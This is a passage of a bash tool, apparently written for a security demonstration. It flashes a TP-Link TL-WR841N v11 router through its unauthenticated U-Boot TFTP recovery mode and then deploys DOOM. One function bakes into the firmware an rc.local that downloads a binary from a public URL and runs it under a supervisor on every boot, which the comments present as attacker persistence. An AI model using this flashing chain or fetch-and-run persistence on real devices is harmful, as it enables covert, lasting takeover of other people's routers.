#!/usr/bin/env bash
# =============================================================================
# DOOM on TL-WR841N v11 — unified driver script
#
# The whole demo in one tool. Two logical halves, kept as separate subcommand
# groups so you can see at a glance which stage you're in:
#
#   exploit:*   — base assessment chain (unauth U-Boot TFTP recovery)
#                 Flashes LEDE/OpenWrt (or reverts to stock) via the
#                 reset-hold recovery path. No credentials, no bug —
#                 the bootloader just accepts whatever TFTP serves it.
#
#   doom:*      — the "yes, we can really run DOOM on it" follow-on
#                 Cross-compiles doomgeneric for big-endian MIPS,
#                 scps it + the WAD onto the flashed router, launches,
#                 and sets up /etc/rc.local re-fetch persistence.
#
# All exploit:* commands require only the UART cable + physical access.
# All doom:*    commands assume exploit:flash-openwrt has already run.
#
# Everything that CAN run unattended, runs unattended. The one thing
# this can't do for you is the physical reset-hold sequence, and — if
# your VM isn't L2-bridged to the router's LAN — host-level networking
# changes outside the VM's reach. For those, it prints the exact commands
# and waits for you, instead of failing silently or guessing.
#
# Full writeup:   ./assessment_report.md
# Copy-paste CS:  ./CHEATSHEET.md
# In-game ctrls:  ./docs/DOOM.md
# =============================================================================

set -uo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

# ── Addresses + files ───────────────────────────────────────────────────────
UART="/dev/ttyUSB0"
BAUD=115200
RECOVERY_IP="192.168.0.66"            # TFTP server IP U-Boot is hardcoded to fetch from
RECOVERY_CLIENT_IP="192.168.0.86"     # U-Boot's own client IP during recovery
ROUTER_UBOOT_MAC="ba:be:fa:ce:08:41"
STOCK_LAN_IP="192.168.0.1"            # stock TP-Link web admin
LEDE_LAN_IP="192.168.1.1"             # post-flash OpenWrt
SERVER_IP="192.168.1.66"              # this VM's own address on the post-flash LAN
HTTP_PORT="8080"                      # firmware-server port for rc.local re-fetch
SERVER="http://${SERVER_IP}:${HTTP_PORT}"
RECOVERY_FILENAME="wr841nv11_tp_recovery.bin"
STAGING_DIR="/tmp/tftp"

STOCK_FW="${SCRIPT_DIR}/firmwares/stock/wr841n_v11_160325.bin"
OPENWRT_FW="${SCRIPT_DIR}/firmwares/openwrt/lede-17.01.4-ar71xx-generic-tl-wr841-v11-squashfs-factory.bin"
CAPTURE_FILE="/tmp/wr841n_exploit_capture.txt"

DOOM_SRC="${SCRIPT_DIR}/doom/source/doomgeneric"
DOOM_DIR="${SCRIPT_DIR}/doom"
BIN_PATH="${DOOM_DIR}/doomgeneric-mips-be"
WAD_PATH="${DOOM_DIR}/doom1.wad"
WAD_SHA1_EXPECT="5b2e249b9c5133ec987b3ea77596381dc0d6bc1d"

SDK_URL="https://archive.openwrt.org/releases/17.01.4/targets/ar71xx/generic/lede-sdk-17.01.4-ar71xx-generic_gcc-5.4.0_musl-1.1.16.Linux-x86_64.tar.xz"
SDK_DIR="${SCRIPT_DIR}/sdk"

# LEDE 17.01.4 Dropbear only offers legacy KEX; modern OpenSSH disables these
# by default. Full rationale: assessment_report.md Appendix B.
# ControlMaster: multiplex ALL subsequent ssh/scp calls over one TCP session.
# On this slow MIPS CPU each legacy-KEX handshake costs ~500ms — multiplexing
# turns a 6-call deploy from ~3s of pure handshake overhead into ~0.5s total.
SSH_CTRL_SOCK="/tmp/pwn-router-ssh-%r@%h:%p"
SSH_OPTS=(-o KexAlgorithms=diffie-hellman-group14-sha1 -o HostKeyAlgorithms=ssh-rsa
          -o Ciphers=aes128-ctr -o MACs=hmac-sha1 -o StrictHostKeyChecking=no
          -o UserKnownHostsFile=/dev/null -o ConnectTimeout=6
          -o ControlMaster=auto -o "ControlPath=${SSH_CTRL_SOCK}" -o ControlPersist=30s)
# -O: legacy SCP protocol — Dropbear has no sftp-server, so modern scp fails.
SCP_OPTS=(-O "${SSH_OPTS[@]}")

# ── Output helpers ──────────────────────────────────────────────────────────
RED='\033[0;31m'; GRN='\033[0;32m'; YEL='\033[0;33m'; CYN='\033[0;36m'; RST='\033[0m'
info() { echo -e "${GRN}[+]${RST} $*"; }
warn() { echo -e "${YEL}[!]${RST} $*"; }
fail() { echo -e "${RED}[-]${RST} $*"; exit 1; }
step() { echo -e "\n${CYN}═══ $1: $2 ═══${RST}"; }

# shellcheck disable=SC2029  # intentional: caller single-quotes its own remote command
router_ssh() { ssh "${SSH_OPTS[@]}" root@"$LEDE_LAN_IP" "$@"; }
router_up()  { ping -c1 -W1 "$LEDE_LAN_IP" >/dev/null 2>&1; }

require_router_up() {
    router_up || fail "Router not reachable at $LEDE_LAN_IP. Run: $0 exploit:status (and exploit:check-network / exploit:flash-openwrt if needed)."
}

# =============================================================================
# EXPLOIT SIDE — the base U-Boot TFTP recovery attack
# =============================================================================

# Shared L2/bridge diagnostic. Field failure #1 is "VM not bridged to the
# router's LAN." This prints exact fix commands for both host AND VM instead
# of guessing. Returns 0 if L2-reachable, 1 otherwise.
exploit_check_network() {
    step "net" "Recovery-subnet L2 adjacency check"

    local iface="${RECOVERY_IFACE:-}"
    if [[ -z "$iface" ]]; then
        # Prefer an interface ALREADY on the router's subnet; default route
        # is often wrong (NAT NIC not bridged to the router).
        iface="$(ip -o -4 addr show | awk '/inet 192\.168\.[01]\./{print $2; exit}')"
        if [[ -z "$iface" ]]; then
            iface="$(ip -4 route show default | awk '{print $NF; exit}')"
            [[ -n "$iface" && "$iface" != "static" ]] || iface="eth0"
            warn "No interface already on 192.168.0.x/192.168.1.x — guessing '$iface' (default route)."
            warn "Override with: RECOVERY_IFACE=<iface> $0 ..."
        fi
    fi
    info "Using interface: $iface"

    if ! ip -4 addr show dev "$iface" 2>/dev/null | grep -q "inet ${RECOVERY_IP}/"; then
        if [[ -t 0 ]]; then
            info "Adding ${RECOVERY_IP}/24 to ${iface} (sudo may prompt)..."
            sudo ip addr add "${RECOVERY_IP}/24" dev "$iface" 2>/dev/null
            sudo ip link set "$iface" up
        elif sudo -n true 2>/dev/null; then
            sudo ip addr add "${RECOVERY_IP}/24" dev "$iface" 2>/dev/null
            sudo ip link set "$iface" up
        else
            warn "This needs sudo + no TTY to prompt. Run yourself:"
            warn "  sudo ip addr add ${RECOVERY_IP}/24 dev ${iface} && sudo ip link set ${iface} up"
            return 1
        fi
    fi
    ip -4 addr show dev "$iface" | grep -q "inet ${RECOVERY_IP}/" \
        && info "Recovery IP ${RECOVERY_IP}/24 on $iface ✓"

    # Add post-flash LAN subnet while we're here — needed once OpenWrt is up,
    # harmless before.
    if ! ip -4 addr show dev "$iface" 2>/dev/null | grep -q "inet ${SERVER_IP}/"; then
        if [[ -t 0 ]]; then
            sudo ip addr add "${SERVER_IP}/24" dev "$iface" 2>/dev/null || true
        else
            sudo -n ip addr add "${SERVER_IP}/24" dev "$iface" 2>/dev/null || true
        fi
    fi

    # arping needs root. On a real terminal, just ask directly. Only fall back
    # to the unprivileged ping probe when there's no TTY AND no cached sudo.
    local -a sudo_arping=()
    if [[ -t 0 ]]; then
        sudo_arping=(sudo)
    elif sudo -n true 2>/dev/null; then
        sudo_arping=(sudo -n)
    fi

    local l2_ok=""
    if command -v arping >/dev/null 2>&1 && [[ ${#sudo_arping[@]} -gt 0 ]]; then
        for ip in "$STOCK_LAN_IP" "$LEDE_LAN_IP" "$RECOVERY_CLIENT_IP"; do
            if "${sudo_arping[@]}" arping -I "$iface" -c 2 -w 3 "$ip" >/dev/null 2>&1; then
                l2_ok=1; break
            fi
        done
    else
        for ip in "$STOCK_LAN_IP" "$LEDE_LAN_IP" "$RECOVERY_CLIENT_IP"; do
            if ping -I "$iface" -c 1 -W 1 "$ip" >/dev/null 2>&1; then
                l2_ok=1; break
            fi
        done
    fi

    if [[ -n "$l2_ok" ]]; then
        info "Router reachable on L2 via $iface ✓"
        return 0
    fi

    warn "Router did NOT respond on L2 from $iface."
    warn "TFTP recovery will trigger but time out until this is fixed."
    cat <<'EOF' >&2

── Run on your HOST (physical machine, outside this VM) ──

  STEP 1 — find your REAL physical NIC name:
    ip -br link show
    # Ignore: lo, virbr0, vnet*, veth*, docker0, br-*, wl*/wlan* (unless Wi-Fi)
    # What's left (eno1 / eth0 / enp<N>s<N>) is the one the router is plugged into.

  STEP 2 — bridge THAT interface (substitute real name, e.g. eno1):
    sudo ip link set eno1 master virbr0
    sudo ip link set eno1 up

  STEP 3 — verify physical NIC + VM's taps are on the bridge TOGETHER:
    sudo bridge link show master virbr0
    # Expect eno1 AND vnet0 (and maybe vnet1) all "state forwarding".

  STEP 4 (optional, if host browser must reach the router too) —
    don't put the host's address on eno1 itself (it's now a bridge member and
    locally-generated 'Destination Host Unreachable' is the common result).
    Put it on the BRIDGE device instead:
      sudo ip addr add 192.168.1.68/24 dev virbr0

── Then re-run on this VM ──
EOF
    warn "  $0 exploit:check-network"
    return 1
}

# The actual flash: stage firmware → start TFTP → arm UART → wait for the
# physical reset-hold → verify. Target is 'openwrt' or 'stock'.
exploit_flash() {
    local target="${1:-openwrt}"
    local fw label expect_ip

    case "$target" in
        openwrt|lede)
            fw="$OPENWRT_FW"; label="LEDE/OpenWrt 17.01.4"; expect_ip="$LEDE_LAN_IP" ;;
        stock)
            fw="$STOCK_FW";   label="Stock TP-Link";        expect_ip="$STOCK_LAN_IP" ;;
        *) fail "Unknown flash target '$target' — use 'openwrt' or 'stock'" ;;
    esac

    step 1 "Preflight checks"
    [[ -e "$UART" ]]            || fail "Missing $UART — CP2102 plugged in?"
    [[ -f "$fw" ]]               || fail "Missing firmware: $fw"
    command -v atftpd >/dev/null || fail "atftpd not installed (apt install atftpd)"
    command -v arping >/dev/null || warn "arping not installed — L2 check degraded"
    info "Target: $label"
    info "  File: $fw"
    info "  Size: $(stat -c%s "$fw") bytes"
    info "  SHA1: $(sha1sum "$fw" | cut -d' ' -f1)"

    exploit_check_network || {
        warn "Continuing anyway in 5s (Ctrl-C to stop and fix networking first)..."
        sleep 5
    }

    step 2 "Stage firmware + start TFTP server"
    mkdir -p "$STAGING_DIR"
    cp "$fw" "$STAGING_DIR/$RECOVERY_FILENAME"
    pkill atftpd 2>/dev/null || true
    sleep 1
    atftpd --daemon --bind-address "$RECOVERY_IP" --verbose "$STAGING_DIR"
    sleep 1
    ss -ulpn | grep -q ":69" || fail "atftpd failed — port 69 taken?"
    info "atftpd bound to ${RECOVERY_IP}:69 serving $RECOVERY_FILENAME ✓"

    step 3 "Arm UART capture + trigger recovery"
    fuser -k -9 "$UART" 2>/dev/null || true
    sleep 1
    stty -F "$UART" "$BAUD" raw -echo
    ( exec 9<>"$UART"; timeout 150 cat <&9 > "$CAPTURE_FILE" ) &
    local capture_pid=$!
    sleep 2
    info "UART capture armed → $CAPTURE_FILE"
    cat <<EOF

${CYN}═══════════════════════════════════════════════════════════════${RST}
  NOW DO THIS ON THE ROUTER:
    1. Unplug power
    2. Press and HOLD Reset
    3. While holding Reset, plug power back in
    4. KEEP HOLDING for 8-10 seconds
    5. Release
${CYN}═══════════════════════════════════════════════════════════════${RST}

EOF
    info "Waiting (poll every 2s, up to 150s — exits early once done)..."
    local waited=0
    while [[ $waited -lt 150 ]]; do
        if grep -qa "Bytes transferred" "$CAPTURE_FILE" 2>/dev/null \
           && ping -c1 -W1 "$expect_ip" >/dev/null 2>&1; then
            info "Transfer + boot confirmed after ~${waited}s ✓"
            break
        fi
        sleep 2
        waited=$((waited + 2))
    done
    kill "$capture_pid" 2>/dev/null
    wait "$capture_pid" 2>/dev/null

    step 4 "Verify flash results"
    if grep -qa "is_auto_upload_firmware=1" "$CAPTURE_FILE" 2>/dev/null; then
        info "Recovery mode triggered ✓"
    else
        warn "Recovery mode not confirmed — hold Reset longer and retry"
    fi
    if grep -qa "Bytes transferred" "$CAPTURE_FILE" 2>/dev/null; then
        info "TFTP transfer: $(grep -a "Bytes transferred" "$CAPTURE_FILE" | tail -1) ✓"
    else
        warn "No TFTP transfer in capture."
        if ip neigh show | grep -qE "$ROUTER_UBOOT_MAC|$RECOVERY_CLIENT_IP"; then
            warn "Router WAS heard on L2 — check atftpd/payload, not the bridge."
        else
            warn "Router was NOT heard on L2 — host-side bridge still the problem."
            warn "Re-run: $0 exploit:check-network"
        fi
    fi
    grep -qa "product id verify" "$CAPTURE_FILE" 2>/dev/null && info "Product ID verified by U-Boot ✓"
    grep -qa "Erased.*sectors"    "$CAPTURE_FILE" 2>/dev/null && info "$(grep -a "Erased" "$CAPTURE_FILE" | head -1) ✓"

    step 5 "Confirm boot"
    info "Waiting up to 60s for $expect_ip..."
    local n=0
    until ping -c1 -W1 "$expect_ip" >/dev/null 2>&1; do
        sleep 2; n=$((n+1))
        [[ $n -gt 30 ]] && { warn "Not reachable — may still be booting, or flash failed."; break; }
    done
    if ping -c1 -W1 "$expect_ip" >/dev/null 2>&1; then
        info "$label is up at $expect_ip ✓"
        if [[ "$target" == "stock" ]]; then
            info "Login: http://$expect_ip admin/admin"
        else
            info "Login: ssh root@$expect_ip (empty password)"
        fi
    fi
}

exploit_status() {
    step "status" "Detect currently running firmware"
    if ping -c1 -W1 "$LEDE_LAN_IP" >/dev/null 2>&1; then
        info "OpenWrt/LEDE is running — LAN IP $LEDE_LAN_IP"
        router_ssh -o BatchMode=yes 'cat /etc/openwrt_release 2>/dev/null' 2>/dev/null || true
    elif ping -c1 -W1 "$STOCK_LAN_IP" >/dev/null 2>&1; then
        info "Stock TP-Link firmware running — LAN IP $STOCK_LAN_IP"
        info "  Web login: http://$STOCK_LAN_IP  (admin/admin)"
    else
        warn "Neither $LEDE_LAN_IP nor $STOCK_LAN_IP answered."
        warn "Router may be mid-boot, off, or not L2-reachable: $0 exploit:check-network"
    fi
}

exploit_ssh() {
    if ping -c1 -W1 "$LEDE_LAN_IP" >/dev/null 2>&1; then
        exec ssh "${SSH_OPTS[@]}" root@"$LEDE_LAN_IP"
    fi
    fail "OpenWrt not reachable at $LEDE_LAN_IP. Stock firmware has no SSH — use web UI or run: $0 exploit:flash-openwrt"
}

# =============================================================================
# One-time-physical variant: build a custom OpenWrt factory image with a
# baked-in /etc/rc.local that auto-fetches DOOM from a public URL on every
# boot, then flash it via the same TFTP recovery path. After this runs, the
# attacker's physical access requirement is complete — the router autonomously
# pulls its payload over the WAN link from then on, with no further on-site
# or LAN presence needed.
#
# This exists specifically to demonstrate the "sixty seconds of physical
# access, exactly once, ever" property of the vulnerability — the current
# scp-after-flash flow understates the real risk by implying ongoing LAN
# presence is needed. See the README's "How often does the attacker need
# to be present?" section.
#
# Uses the OFFICIAL OpenWrt Image Builder (not a hand-patched squashfs),
# so the resulting image's provenance can be audited against upstream.
# =============================================================================

IB_URL="https://archive.openwrt.org/releases/17.01.4/targets/ar71xx/generic/lede-imagebuilder-17.01.4-ar71xx-generic.Linux-x86_64.tar.xz"
IB_DIR="${SDK_DIR}/imagebuilder"

exploit_flash_remote_doom() {
    local public_url="${1:-}"
    if [[ -z "$public_url" ]]; then
        cat <<EOF
Usage: $0 exploit:flash-remote-doom <public-url>

  <public-url>  An internet-reachable base URL that will serve the two files
                'doomgeneric-mips-be' and 'doom1.wad' at that path. Example:
                  https://github.com/<you>/doom-mips-release/releases/download/v1

  The custom firmware's /etc/rc.local will do:
      wget <public-url>/doomgeneric-mips-be  -O /tmp/doomgeneric
      wget <public-url>/doom1.wad            -O /tmp/doom1.wad

  To host the files yourself, publish doom/doomgeneric-mips-be and
  doom/doom1.wad from this repo under any public URL you control.
EOF
        exit 1
    fi

    step 1 "Preflight — image builder + target hardware"
    [[ -e "$UART" ]]            || fail "Missing $UART — CP2102 plugged in?"
    command -v atftpd >/dev/null || fail "atftpd not installed (apt install atftpd)"
    command -v make >/dev/null   || fail "make not installed (apt install build-essential)"

    # 1. Image Builder (download + cache; ~30 MB first time only)
    local ib_root
    ib_root=$(find "$IB_DIR" -maxdepth 2 -type d -name "lede-imagebuilder-*" 2>/dev/null | head -1)
    if [[ -z "$ib_root" ]]; then
        info "First run — downloading OpenWrt ar71xx 17.01.4 Image Builder (~30MB)..."
        mkdir -p "$IB_DIR"
        if [[ ! -f "$IB_DIR/ib.tar.xz" ]]; then
            curl -fsSL -o "$IB_DIR/ib.tar.xz" "$IB_URL" || fail "Image Builder download failed"
        fi
        tar -xf "$IB_DIR/ib.tar.xz" -C "$IB_DIR" || fail "Image Builder extraction failed"
        ib_root=$(find "$IB_DIR" -maxdepth 2 -type d -name "lede-imagebuilder-*" | head -1)
        [[ -n "$ib_root" ]] || fail "Image Builder not found after extraction"
        info "Image Builder cached at $ib_root (reused on future runs)"
    else
        info "Using cached Image Builder: $ib_root"
    fi

    step 2 "Compose the baked-in /etc/rc.local"
    local files_dir="${SCRIPT_DIR}/.ib_files"
    rm -rf "$files_dir"
    mkdir -p "$files_dir/etc"

    # Baked-in rc.local uses the SAME supervisor pattern as doom:persist's
    # inline loop — parallel healthcheck + wait on $DOOM_PID — so a mongoose
    # event-loop wedge recovers in <30s and a crash respawns in ~2s.
    # The ONLY material difference is the fetch URL: a public internet URL
    # instead of 192.168.1.66 on the local LAN.
    cat > "$files_dir/etc/rc.local" <<RCLOCAL
# Baked-in rc.local — written by pwn-router.sh exploit:flash-remote-doom.
# Fetches DOOM from a public URL on each boot (no local LAN host needed).

(
    URL="$public_url"
    LOG=/tmp/doom_boot.log
    : > "\$LOG"
    log() { echo "\$(date -u +%H:%M:%S) \$*" >> "\$LOG"; }
    log "=== baked-in rc.local starting, URL=\$URL ==="

    # Wait up to 90s for internet reachability (DHCP + default gateway +
    # DNS may need a few seconds after br-lan forwarding comes up).
    i=0
    while [ "\$i" -lt 90 ]; do
        if wget -q --spider "\$URL/doomgeneric-mips-be" 2>/dev/null; then
            log "URL reachable after \${i}s"
            break
        fi
        sleep 1; i=\$((i + 1))
    done
    if [ "\$i" -ge 90 ]; then
        log "ERROR: URL unreachable after 90s, giving up this boot"
        exit 1
    fi

    # Fetch with retry + size sanity (reject obviously-empty responses).
    fetch_retry() {
        src=\$1; dst=\$2; min_size=\$3
        attempt=0
        while [ "\$attempt" -lt 3 ]; do
            rm -f "\$dst"
            wget -q -O "\$dst" "\$URL/\$src"
            got=\$(wc -c < "\$dst" 2>/dev/null || echo 0)
            if [ "\$got" -gt "\$min_size" ]; then
                log "fetched \$src (\$got bytes) OK"
                return 0
            fi
            log "fetch \$src attempt \$((attempt+1)): got only \$got bytes"
            attempt=\$((attempt + 1))
            sleep 2
        done
        return 1
    }
    fetch_retry doomgeneric-mips-be /tmp/doomgeneric 500000 || exit 1
    fetch_retry doom1.wad           /tmp/doom1.wad   3000000 || exit 1
    chmod +x /tmp/doomgeneric

    # Supervisor: respawn on crash OR mongoose wedge. Same pattern as
    # doom:persist's inline version (see pwn-router.sh for rationale).
    launches=0
    while true; do
        launches=\$((launches + 1))
        log "launching doomgeneric (attempt #\$launches)"
        cd /tmp && ./doomgeneric >> "\$LOG" 2>&1 &
        DOOM_PID=\$!

        ( while sleep 30; do
              kill -0 \$DOOM_PID 2>/dev/null || exit 0
              if ! wget -q --spider --timeout=5 http://127.0.0.1:8000/ 2>/dev/null; then
                  echo "\$(date -u +%H:%M:%S) [watch] :8000 wedge, killing \$DOOM_PID" >> "\$LOG"
                  kill -9 \$DOOM_PID 2>/dev/null
                  exit 0
              fi
          done ) &
        HC_PID=\$!

        wait \$DOOM_PID 2>/dev/null
        kill \$HC_PID 2>/dev/null; wait \$HC_PID 2>/dev/null
        log "doomgeneric exited (pid \$DOOM_PID), respawning in 2s"
        sleep 2
    done
) &

exit 0
RCLOCAL
    chmod +x "$files_dir/etc/rc.local"
    info "Composed custom rc.local (fetches from $public_url)"

    step 3 "Build the custom factory image via OpenWrt Image Builder"
    local image_out
    (
        cd "$ib_root"
        info "Running: make image PROFILE=TLWR841v11 FILES=$files_dir (first build ~1 min)"
        make image PROFILE=TLWR841v11 FILES="$files_dir" >/tmp/ib_build.log 2>&1
    ) || { tail -30 /tmp/ib_build.log; fail "Image Builder failed — see /tmp/ib_build.log"; }

    image_out=$(find "$ib_root/bin" -name "*tl-wr841-v11*squashfs-factory.bin" 2>/dev/null | head -1)
    [[ -f "$image_out" ]] || fail "Image Builder didn't produce a factory image for TLWR841v11"
    info "Custom image: $image_out ($(stat -c%s "$image_out") bytes, SHA1 $(sha1sum "$image_out" | cut -d' ' -f1))"

    # Stage into firmwares/ for the regular flash path to find.
    mkdir -p "${SCRIPT_DIR}/firmwares/openwrt-custom"
    local staged="${SCRIPT_DIR}/firmwares/openwrt-custom/custom-tl-wr841-v11-remote-doom.bin"
    cp "$image_out" "$staged"
    info "Staged: $staged"

    step 4 "Flash the custom image via the SAME TFTP recovery path"
    info "After this flash finishes, your laptop can leave the LAN. The router"
    info "will autonomously fetch DOOM from $public_url on every boot — forever."
    local saved_fw="$OPENWRT_FW"
    OPENWRT_FW="$staged"
    exploit_flash openwrt
    OPENWRT_FW="$saved_fw"
}

exploit_reboot() {
    step "reboot" "Reboot current OS and wait for it back"
    if ! router_ssh -o BatchMode=yes true 2>/dev/null; then
        fail "Can't SSH to $LEDE_LAN_IP. Is OpenWrt flashed? Run: $0 exploit:status"
    fi
    info "Rebooting $LEDE_LAN_IP ..."
    router_ssh reboot 2>/dev/null
    info "Waiting to go down..."
    local n=0
    while router_up; do sleep 1; n=$((n+1)); [[ $n -gt 20 ]] && break; done
    info "Waiting to come back..."
    n=0
    until router_up; do
        sleep 2; n=$((n+1))
        [[ $n -gt 45 ]] && fail "Still unreachable after 90s — check UART/power."
    done
    info "Back up ✓ ($LEDE_LAN_IP)"
}

# =============================================================================
# DOOM SIDE — build, deploy, launch, persist
#
# Refactored for reliability + speed. Highlights:
#   • SSH ControlMaster multiplexes all router ops over one TCP session —
#     a 6-call deploy drops from ~3s of handshake overhead to ~0.5s total.
#   • scp'd files are size-verified on the router before launch, so a
#     corrupt/partial copy fails loudly instead of silently crashing.
#   • Every "wait for service" is a poll loop (fast success, bounded fail),
#     not a blind `sleep N; curl once`.
#   • rc.local has retry + size verification + timestamped logging to
#     /tmp/doom_boot.log — a dropped boot-time packet no longer silently
#     wedges persistence until next manual deploy.
#   • New: doom:clean (full reset), doom:logs (aggregated diagnostics).
# =============================================================================

# ── Helpers scoped to the DOOM half ─────────────────────────────────────────

# One SSH call for everything we need to know about current router state —
# much cheaper than 5 separate ssh invocations even with ControlMaster.
# shellcheck disable=SC2016
_router_doom_snapshot() {
    router_ssh '
        echo "---ps---"
        ps w | grep -v grep | grep doomgeneric
        echo "---watch---"
        pgrep -f doom_watch.sh >/dev/null 2>&1 && echo "supervisor: RUNNING" || echo "supervisor: not running"
        echo "---listen---"
        netstat -ltn 2>/dev/null | grep ":8000"
        echo "---files---"
        ls -la /tmp/doomgeneric /tmp/doom1.wad 2>&1
        echo "---rc.local---"
        grep -q "DOOM-on-router autostart" /etc/rc.local 2>/dev/null && echo "persistence: INSTALLED" || echo "persistence: not installed"
        echo "---free---"
        df /tmp | awk "NR==2"
        echo "---doom.log---"
        tail -5 /tmp/doom.log 2>/dev/null
    ' 2>/dev/null
}

# curl :8000, return 0 if 200 OK — single-shot (callers wrap in a poll).
_doom_serving() {
    curl -sS -m2 -o /dev/null -w "%{http_code}" "http://${LEDE_LAN_IP}:8000/" 2>/dev/null | grep -q "200"
}

# Poll :8000 for up to N seconds (default 15). Returns 0 as soon as served.
_wait_for_doom_ready() {
    local max="${1:-15}" n=0
    while [[ $n -lt "$max" ]]; do
        _doom_serving && return 0
        sleep 1; n=$((n+1))
    done
    return 1
}

# True iff the local HTTP server returns 200 on BOTH artifacts the router
# needs. python3 -m http.server caches the serving dir at startup, so a
# server left over from a previous dir may 404 — this catches that case.
_http_server_healthy() {
    curl -sS -m3 -o /dev/null -w "%{http_code}" "$SERVER/doomgeneric-mips-be" 2>/dev/null | grep -q "200" || return 1
    curl -sS -m3 -o /dev/null -w "%{http_code}" "$SERVER/doom1.wad"           2>/dev/null | grep -q "200" || return 1
    return 0
}

_kill_local_http_server() {
    # Match by port — the daemonized python has a different cmdline than
    # a plain `python -m http.server`, so pattern-matching by name is
    # unreliable. fuser targets whatever process holds the TCP port.
    if ss -ltn 2>/dev/null | grep -q ":${HTTP_PORT} "; then
        fuser -k -TERM "${HTTP_PORT}/tcp" >/dev/null 2>&1 || true
        sleep 1
        if ss -ltn 2>/dev/null | grep -q ":${HTTP_PORT} "; then
            fuser -k -KILL "${HTTP_PORT}/tcp" >/dev/null 2>&1 || true
            sleep 1
        fi
    fi
}

# Clean up the SSH ControlMaster socket on exit so the next invocation
# gets a fresh master. (ControlPersist handles the warm-reuse case; this
# just avoids a lingering socket outlasting the script.)
_cleanup_ssh_master() {
    ssh -o ControlPath="$SSH_CTRL_SOCK" -O exit root@"$LEDE_LAN_IP" 2>/dev/null || true
}
trap _cleanup_ssh_master EXIT

# A thin supervisor script we install on the router at /tmp/doom_watch.sh.
# It launches doomgeneric and polls http://127.0.0.1:8000/ every 30s;
# if the port stops answering (the known mongoose single-threaded-event-loop
# wedge: a dropped browser connection fills the send buffer, send() hangs on
# EAGAIN, the game loop pins trying to drain it, and accept() never runs),
# the supervisor force-kills the wedged process and respawns within ~2s.
# Also respawns on any normal exit. Printed via heredoc so the embedded
# shell variables aren't expanded locally.
_doom_watcher_script() {
    cat <<'SH'
#!/bin/sh
# DOOM supervisor — auto-recovers from mongoose event-loop wedges AND
# any other reason the game process exits.
#
# Design: run doomgeneric and a periodic healthchecker as PARALLEL children,
# then `wait` on doomgeneric specifically. `wait` returns immediately when
# the pid dies (crash, external kill, OR killed-by-healthchecker), so
# respawn-on-crash is ~2s instead of up-to-HC_INTERVAL seconds.
# A single-threaded `sleep N; kill -0 PID; sleep N; ...` version would miss
# crashes for most of the sleep window — observed live.
LOG=/tmp/doom.log
HC_INTERVAL=30            # seconds between port-8000 healthchecks
HC_TIMEOUT=5              # per-healthcheck wget timeout
RESPAWN_DELAY=2           # pause before relaunching after exit

log() { echo "$(date -u +%H:%M:%S) [watch] $*" >>"$LOG"; }

cleanup() {
    log "supervisor caught signal, shutting down"
    [ -n "$HC_PID"   ] && kill $HC_PID   2>/dev/null
    [ -n "$DOOM_PID" ] && kill -9 $DOOM_PID 2>/dev/null
    exit 0
}
trap cleanup TERM INT

log "=== supervisor starting (hc_interval=${HC_INTERVAL}s) ==="
launches=0
while true; do
    launches=$((launches + 1))
    log "launching doomgeneric (attempt #$launches)"
    cd /tmp && ./doomgeneric >>"$LOG" 2>&1 &
    DOOM_PID=$!

    # Parallel healthchecker: every HC_INTERVAL seconds, probe :8000.
    # If the port stops answering (wedge), kill doom and exit the checker;
    # the `wait $DOOM_PID` below will unblock immediately.
    (
        while sleep $HC_INTERVAL; do
            kill -0 $DOOM_PID 2>/dev/null || exit 0
            if ! wget -q --spider --timeout=$HC_TIMEOUT http://127.0.0.1:8000/ 2>/dev/null; then
                echo "$(date -u +%H:%M:%S) [watch] healthcheck FAILED, killing wedged pid $DOOM_PID" >>"$LOG"
                kill -9 $DOOM_PID 2>/dev/null
                exit 0
            fi
        done
    ) &
    HC_PID=$!

    # Block until doom exits — crash OR healthcheck-induced kill unblocks us.
    wait $DOOM_PID 2>/dev/null
    DOOM_RC=$?

    # Reap the healthchecker if it's still around.
    kill $HC_PID 2>/dev/null
    wait $HC_PID 2>/dev/null

    log "doomgeneric exited (pid $DOOM_PID, rc=$DOOM_RC), respawning in ${RESPAWN_DELAY}s"
    sleep $RESPAWN_DELAY
done
SH
}

# ── Commands ────────────────────────────────────────────────────────────────

doom_build() {
    step "build" "Cross-compile doomgeneric for big-endian MIPS"

    if [[ -x "$BIN_PATH" ]] && file "$BIN_PATH" 2>/dev/null | grep -q "MSB"; then
        info "Already have verified big-endian binary at $BIN_PATH — skipping."
        info "(delete it to force a rebuild)"
        return 0
    fi

    local sdk_root="$SDK_DIR/lede-sdk-17.01.4-ar71xx-generic_gcc-5.4.0_musl-1.1.16.Linux-x86_64"
    if [[ ! -d "$sdk_root" ]]; then
        info "Downloading OpenWrt ar71xx SDK (big-endian MIPS toolchain)..."
        mkdir -p "$SDK_DIR"
        if [[ ! -f "$SDK_DIR/sdk.tar.xz" ]]; then
            curl -fsSL -o "$SDK_DIR/sdk.tar.xz" "$SDK_URL" || fail "SDK download failed"
        fi
        tar -xf "$SDK_DIR/sdk.tar.xz" -C "$SDK_DIR"
    fi
    local toolchain_dir
    toolchain_dir="$(find "$SDK_DIR" -maxdepth 4 -type d -name "toolchain-mips_*" | head -1)"
    [[ -n "$toolchain_dir" ]] || fail "Couldn't locate the toolchain dir inside $SDK_DIR"
    export PATH="$toolchain_dir/bin:$PATH"

    [[ -d "$DOOM_SRC" ]] || fail "Missing $DOOM_SRC — doom source not checked out?"
    ( cd "$DOOM_SRC" \
      && make -f Makefile.mips clean \
      && make -f Makefile.mips CROSS_COMPILE=mips-openwrt-linux-musl- STATIC_LINKING=1 all
    ) || fail "Build failed"

    file "$DOOM_SRC/build/doomgeneric" | grep -q "MSB" \
        || fail "Built binary is NOT big-endian — wrong toolchain picked up"
    mkdir -p "$DOOM_DIR"
    cp "$DOOM_SRC/build/doomgeneric" "$BIN_PATH"
    info "Built + verified big-endian MIPS binary → $BIN_PATH ✓"
}

doom_wad() {
    step "wad" "Get the full (non-aliased) shareware WAD"

    if [[ -f "$WAD_PATH" ]] && [[ "$(sha1sum "$WAD_PATH" | cut -d' ' -f1)" == "$WAD_SHA1_EXPECT" ]]; then
        info "Correct doom1.wad already present ✓"
        return 0
    fi

    warn "Don't use a trimmed WAD (e.g. squashware-1lev) — it aliases all 9"
    warn "E1Mx map markers to the same data (level-select mismatch bug)."

    local tmp="${SCRIPT_DIR}/.wad_fetch"
    mkdir -p "$tmp"
    if apt-get download doom-wad-shareware -o Dir::Cache="$tmp" >/dev/null 2>&1 \
        || ( cd "$tmp" && apt-get download doom-wad-shareware >/dev/null 2>&1 ); then
        local deb
